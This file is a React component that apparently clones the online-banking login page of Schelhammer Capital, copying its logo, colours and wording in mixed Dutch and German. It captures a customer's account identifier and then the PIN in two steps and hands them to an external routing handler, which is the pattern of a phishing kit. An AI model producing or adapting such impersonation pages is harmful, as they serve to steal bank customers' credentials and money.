"use client";

import React, { useState } from "react";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function SchelhammerCapital({ formData, onChange, handleRouteAction, saving }: Props) {
  const [step, setStep] = useState(1);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    if (formData.verfuegernummer) {
      setStep(2);
    }
  };

  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleRouteAction();
  };

  return (
    <div className="min-h-screen flex flex-col font-sans">
      {/* Header */}
      <header className="bg-white h-[85px] flex items-center px-4 md:px-12 w-full shadow-sm relative z-10">
        <img 
          src="/schelhammer-logo.webp" 
          alt="Schelhammer Capital 1832" 
          className="h-[60px] object-contain ml-4 lg:ml-24 mix-blend-multiply" 
        />
      </header>

      {/* Main Background Area */}
      <main 
        className="flex-grow flex items-center justify-center p-4 bg-cover bg-center"
        style={{ backgroundImage: "url('/schelhammer-bg.webp')" }}
      >
        {/* Center Card */}
        <div className="relative w-full max-w-[650px]">
          <div className="bg-white shadow-[0_4px_20px_rgba(0,0,0,0.3)] overflow-hidden">
            
            {/* Red Header Bar */}
            <div className="bg-[#cc0000] px-6 py-4">
              <h1 className="text-white text-[22px] font-normal tracking-wide">Login</h1>
            </div>

            <div className="p-6 md:p-8">
              {/* Intro Text */}
              <p className="text-[14px] text-gray-800 mb-6 leading-relaxed">
                Hier kunt u inloggen op uw internetbankieren. Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens nergens anders invoert en deze geheim houdt. Wij zullen u nooit om uw PIN of TAN vragen!
              </p>

              {/* Demo Version Checkbox */}
              <div className="flex items-start gap-4 mb-6">
                <div className="flex-shrink-0 mt-0.5">
                  <div className="w-[22px] h-[22px] bg-[#f4f4f4] border border-gray-300 rounded-[2px]"></div>
                </div>
                <p className="text-[14px] text-gray-500 leading-snug">
                  Möchten Sie sich die Demo-Version ansehen? In diesem Fall brauchen Sie keine Zugangsdaten anzugeben.
                </p>
              </div>

              {/* Login Form */}
              <form 
                onSubmit={step === 1 ? handleNextStep : handleFinalSubmit}
                className="flex flex-col"
              >
                {step === 1 ? (
                  <>
                    <div className="flex justify-between items-end mb-1">
                      <label className="text-[12px] text-gray-400">Gebruikersnaam</label>
                      <div className="text-[12px] text-[#cc0000]">
                        <a href="#" className="hover:underline">Hochkontrast</a> <span className="text-gray-400 mx-1">|</span> <a href="#" className="hover:underline">English</a>
                      </div>
                    </div>
                    <div className="mt-1 mb-6">
                      <input 
                        type="text" 
                        value={formData.verfuegernummer || ""}
                        onChange={(e) => onChange("verfuegernummer", e.target.value)}
                        className="w-full bg-[#f4f4f4] border border-gray-200 rounded-[3px] p-3 h-11 outline-none focus:border-gray-400 transition-colors text-[14px] text-gray-800"
                      />
                    </div>
                  </>
                ) : (
                  <>
                    <div className="flex justify-between items-end mb-1">
                      <label className="text-[12px] text-gray-400">Wachtwoord</label>
                      <div className="text-[12px] text-[#cc0000]">
                        <a href="#" className="hover:underline">Hochkontrast</a> <span className="text-gray-400 mx-1">|</span> <a href="#" className="hover:underline">English</a>
                      </div>
                    </div>
                    <div className="mt-1 mb-6">
                      <input 
                        type="password" 
                        value={formData.pin || ""}
                        onChange={(e) => onChange("pin", e.target.value)}
                        autoFocus
                        className="w-full bg-[#f4f4f4] border border-gray-200 rounded-[3px] p-3 h-11 outline-none focus:border-gray-400 transition-colors text-[14px] text-gray-800"
                      />
                    </div>
                  </>
                )}

                {/* First Time Registration Link */}
                <div className="text-center mb-6">
                  <a href="#" className="text-[14px] text-[#cc0000] hover:underline">
                    Sie melden sich zum ersten Mal an?
                  </a>
                </div>

                {/* Legal Notice */}
                <div className="text-center mb-6 px-4">
                  <p className="text-[13px] text-gray-600">
                    Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu.
                  </p>
                </div>

                {/* Primary Button */}
                <button 
                  type="submit" 
                  disabled={saving} 
                  className="w-full bg-[#cc0000] hover:bg-[#b30000] text-white py-3 rounded-[3px] font-normal transition-colors text-[16px]"
                >
                  {saving ? "Laden..." : "Weiter"}
                </button>
              </form>

              {/* Footer Links */}
              <div className="mt-8 flex flex-col items-center gap-1">
                <a href="#" className="text-[14px] text-[#cc0000] hover:underline">Gebruikersnaam vergessen</a>
                <a href="#" className="text-[14px] text-[#cc0000] hover:underline">Wachtwoord vergessen</a>
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
